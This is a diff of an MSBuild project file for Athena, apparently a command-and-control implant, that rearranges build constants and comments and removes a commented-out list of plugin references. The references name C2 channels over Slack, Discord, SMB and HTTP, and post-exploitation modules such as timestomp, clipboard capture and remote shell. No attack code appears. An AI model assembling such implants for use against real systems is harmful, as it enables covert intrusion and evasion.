@@ -6,12 +6,14 @@
 		<RuntimeIdentifier>$(DOTNET_RUNTIME_IDENTIFIER)</RuntimeIdentifier>
     </PropertyGroup>
 	<PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|AnyCPU'">
-		<DefineConstants>$(DefineConstants)TRACE;$(AthenaConstants)</DefineConstants>
+		<DefineConstants>$(DefineConstants);$(AthenaConstants)</DefineConstants>
 	</PropertyGroup>
 
 	<PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|AnyCPU'">
-		<DefineConstants>$(DefineConstants);TRACE;$(AthenaConstants);</DefineConstants>
+		<DefineConstants>$(DefineConstants);$(AthenaConstants);</DefineConstants>
 	</PropertyGroup>
+	
+	
 	<PropertyGroup Condition="$(AthenaConstants.Contains(WINBUILD))">
 		<OutputType>WinExe</OutputType>
 	</PropertyGroup>
@@ -28,77 +30,41 @@
   </ItemGroup>
 
   <ItemGroup>
-	<!-- Debugging Stuff
-	<ProjectReference Condition="$(AthenaConstants.Contains(DEBUG))" Include="..\Athena.Commands\Athena.Handler.Dynamic.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(DEBUG))" Include="..\Athena.Forwarders.Empty\Athena.Forwarders.Empty.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(DEBUG))" Include="..\Athena.Profiles.Debug\Athena.Profiles.Debug.csproj" />
-	Debugging Stuff -->
-	  
-	<!-- Default Includes -->
 	<ProjectReference Include="..\Athena.Utilities\Athena.Utilities.csproj" GlobalPropertiesToRemove="SelfContained" />
 	<ProjectReference Include="..\Athena.Models\Athena.Models.csproj" GlobalPropertiesToRemove="SelfContained" />
 	<ProjectReference Include="..\Athena.Commands.Common\Athena.Handler.Common.csproj" />
 	<ProjectReference Include="..\AthenaPlugins\PluginBase\Athena.Plugins.csproj" GlobalPropertiesToRemove="SelfContained" />
-	<!-- Default Includes -->
+	<!-- Debugging Stuff
+	<ProjectReference Condition="$(AthenaConstants.Contains(DEBUG))" Include="..\Athena.Commands\Athena.Handler.Dynamic.csproj" />
+	<ProjectReference Condition="$(AthenaConstants.Contains(DEBUG))" Include="..\Athena.Forwarders.Empty\Athena.Forwarders.Empty.csproj" />
+	<ProjectReference Condition="$(AthenaConstants.Contains(DEBUG))" Include="..\Athena.Profiles.Debug\Athena.Profiles.Debug.csproj" />
+	Debugging Stuff --><!--
 	  
-	<!-- Plugin Loading Type -->
+	--><!-- Default Includes --><!--
+
+	--><!-- Default Includes --><!--
+	  
+	--><!-- Plugin Loading Type --><!--
 	<ProjectReference Condition="$(AthenaConstants.Contains(NATIVEAOT))" Include="..\Athena.Commands.Native\Athena.Handler.Native.csproj" />
 	<ProjectReference Condition="$(AthenaConstants.Contains(DYNAMIC))" Include="..\Athena.Commands\Athena.Handler.Dynamic.csproj" />
-	<!-- Plugin Loading Type -->
+	--><!-- Plugin Loading Type --><!--
 	  
-	<!-- C2 Profile Additions -->
+	--><!-- C2 Profile Additions --><!--
 	<ProjectReference Condition="$(AthenaConstants.Contains(DEBUGPROF))" Include="..\Athena.Profiles.Debug\Athena.Profiles.Debug.csproj" />
 	<ProjectReference Condition="$(AthenaConstants.Contains(SLACK))" Include="..\AthenaSlack\Athena.Profiles.Slack.csproj" />
 	<ProjectReference Condition="$(AthenaConstants.Contains(SMB))" Include="..\AthenaSMB\Athena.Profiles.SMB.csproj" />
 	<ProjectReference Condition="$(AthenaConstants.Contains(WEBSOCKET))" Include="..\AthenaWebsocket\Athena.Profiles.Websocket.csproj" />
 	<ProjectReference Condition="$(AthenaConstants.Contains(DISCORD))" Include="..\AthenaDiscord\Athena.Profiles.Discord.csproj" />
 	<ProjectReference Condition="$(AthenaConstants.Contains(HTTP))" Include="..\AthenaHTTP\Athena.Profiles.HTTP.csproj" />
-	<!-- C2 Profile Additions -->
+	--><!-- C2 Profile Additions --><!--
 	  
-	<!-- Fowarder Types -->
-	<ProjectReference Condition="$(AthenaConstants.Contains(EMPTY))" Include="..\Athena.Forwarders.Empty\Athena.Forwarders.Empty.csproj" />
+	--><!-- Fowarder Types --><!--
+	<ProjectReference Condition="$(AthenaConstants.Contains(EMPTYFWD))" Include="..\Athena.Forwarders.Empty\Athena.Forwarders.Empty.csproj" />
 	<ProjectReference Condition="$(AthenaConstants.Contains(SMBFWD))" Include="..\Athena.Forwarders.SMB\Athena.Forwarders.SMB.csproj" />
-	<!-- Fowarder Types -->
+	--><!-- Fowarder Types -->
 	
 	<!-- Trimming Support -->
 	<TrimmerRootDescriptor Include="Roots.xml" />
 	<!-- Trimming Support -->
-	  
-	<!-- Commands -->
-	<!--<ProjectReference Condition="$(AthenaConstants.Contains(ARP))" Include="..\AthenaPlugins\arp\arp.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(CAT))" Include="..\AthenaPlugins\cat\cat.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(CD))" Include="..\AthenaPlugins\cd\cd.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(CP))" Include="..\AthenaPlugins\cp\cp.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(CROP))" Include="..\AthenaPlugins\crop\crop.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(DRIVES))" Include="..\AthenaPlugins\drives\drives.csproj" />
-	--><!--<ProjectReference Include="..\AthenaPlugins\ds\ds.csproj" />--><!--
-	<ProjectReference Condition="$(AthenaConstants.Contains(ENV))" Include="..\AthenaPlugins\env\env.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(FARMER))" Include="..\AthenaPlugins\farmer\farmer.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(GETCLIPBOARD))" Include="..\AthenaPlugins\get-clipboard\get-clipboard.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(GETSESSIONS))" Include="..\AthenaPlugins\get-sessions\get-sessions.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(GETSHARES))" Include="..\AthenaPlugins\get-shares\get-shares.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(HOSTNAME))" Include="..\AthenaPlugins\hostname\hostname.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(IFCONFIG))" Include="..\AthenaPlugins\ifconfig\ifconfig.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(INLINEEXEC))" Include="..\AthenaPlugins\inline-exec\inline-exec.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(KILL))" Include="..\AthenaPlugins\kill\kill.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(LS))" Include="..\AthenaPlugins\ls\ls.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(MKDIR))" Include="..\AthenaPlugins\mkdir\mkdir.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(MV))" Include="..\AthenaPlugins\mv\mv.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(NSLOOKUP))" Include="..\AthenaPlugins\nslookup\nslookup.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(PATCH))" Include="..\AthenaPlugins\patch\patch.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(PS))" Include="..\AthenaPlugins\ps\ps.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(PWD))" Include="..\AthenaPlugins\pwd\pwd.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(REG))" Include="..\AthenaPlugins\reg\reg.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(RM))" Include="..\AthenaPlugins\rm\rm.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(SFTP))" Include="..\AthenaPlugins\sftp\sftp.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(SHELL))" Include="..\AthenaPlugins\shell\shell.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(SSH))" Include="..\AthenaPlugins\ssh\ssh.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(TAIL))" Include="..\AthenaPlugins\tail\tail.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(TESTPORT))" Include="..\AthenaPlugins\test-port\test-port.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(TIMESTOMP))" Include="..\AthenaPlugins\timestomp\timestomp.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(UPTIME))" Include="..\AthenaPlugins\uptime\uptime.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(WHOAMI))" Include="..\AthenaPlugins\whoami\whoami.csproj" />
-	<ProjectReference Condition="$(AthenaConstants.Contains(WINENUMRESOURCES))" Include="..\AthenaPlugins\win-enum-resources\win-enum-resources.csproj" />-->
-	<!-- Commands -->
   </ItemGroup>
 </Project>
